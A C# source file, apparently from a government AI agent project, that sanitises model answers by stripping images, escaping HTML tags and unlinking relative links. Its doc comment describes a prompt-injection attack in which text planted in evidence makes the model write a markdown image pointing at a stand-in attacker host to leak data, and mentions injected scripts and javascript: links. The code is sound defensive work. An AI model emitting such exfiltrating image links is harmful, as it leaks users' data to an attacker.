using System.Text.RegularExpressions;

namespace GovUK.Dfe.AI.Agents.Quality;

/// <summary>
/// Makes answers safe to show as Markdown, or as HTML:
/// <list type="bullet">
/// <item>Images are removed, keeping their alt text. A browser loads an image without a click, so text injected into
/// evidence could make the model write <c>![](https://attacker/?d=...)</c> and leak data. Links need a click, so they stay.</item>
/// <item>A link without a full web address, e.g. <c>[Evidence 1](evidence/1)</c>, would point at the app itself and give a
/// 404, so it's turned back into text. Links to full <c>https://</c> addresses, e.g. web search sources, are kept.</item>
/// <item>HTML the model writes is shown as text, not run: every <c>&lt;</c> that would start a tag or comment becomes
/// <c>&amp;lt;</c>. Text injected into evidence can't then put a script or a <c>javascript:</c> link on the page of an app that
/// renders answers as HTML, e.g. to show citation links. A <c>&lt;</c> before a space or digit, as in "below &lt; 90%",
/// isn't a tag and stays.</item>
/// </list>
/// </summary>
internal static partial class AnswerLinks
{
    public static string? Clean(string? answer)
    {
        if (string.IsNullOrEmpty(answer))
        {
            return answer;
        }

        var cleaned = MarkdownImage().Replace(answer, static image => image.Groups["alt"].Value);
        cleaned = HtmlImage().Replace(cleaned, string.Empty);
        cleaned = HtmlTagStart().Replace(cleaned, "&lt;");
        return MarkdownLink().Replace(cleaned, static link =>
        {
            var (text, target) = (link.Groups["text"].Value, link.Groups["target"].Value.Trim());
            if (IsFullAddress(target))
            {
                return link.Value;
            }

            // A citation keeps its brackets, so it still reads, and checks, as [Evidence n].
            return CitationText().IsMatch(text) ? $"[{text}]" : text;
        });
    }

    private static bool IsFullAddress(string target)
        => Uri.TryCreate(target.Split(' ', 2)[0], UriKind.Absolute, out var uri)
           && (uri.Scheme == Uri.UriSchemeHttps || uri.Scheme == Uri.UriSchemeHttp || uri.Scheme == Uri.UriSchemeMailto);

    [GeneratedRegex(@"!\[(?<alt>[^\[\]]*)\]\((?<target>[^()]*)\)", RegexOptions.CultureInvariant, matchTimeoutMilliseconds: 1000)]
    private static partial Regex MarkdownImage();

    [GeneratedRegex(@"<img\b[^>]*>", RegexOptions.CultureInvariant | RegexOptions.IgnoreCase, matchTimeoutMilliseconds: 1000)]
    private static partial Regex HtmlImage();

    [GeneratedRegex(@"(?<!!)\[(?<text>[^\[\]]+)\]\((?<target>[^()\s]*(?:\s+""[^""]*"")?)\)", RegexOptions.CultureInvariant, matchTimeoutMilliseconds: 1000)]
    private static partial Regex MarkdownLink();

    /// <summary>A "&lt;" that starts a tag, end tag, comment or processing instruction, as an HTML parser reads it.</summary>
    [GeneratedRegex("<(?=[A-Za-z/!?])", RegexOptions.CultureInvariant)]
    private static partial Regex HtmlTagStart();

    [GeneratedRegex(@"^Evidence \d{1,6}$", RegexOptions.CultureInvariant)]
    private static partial Regex CitationText();
}
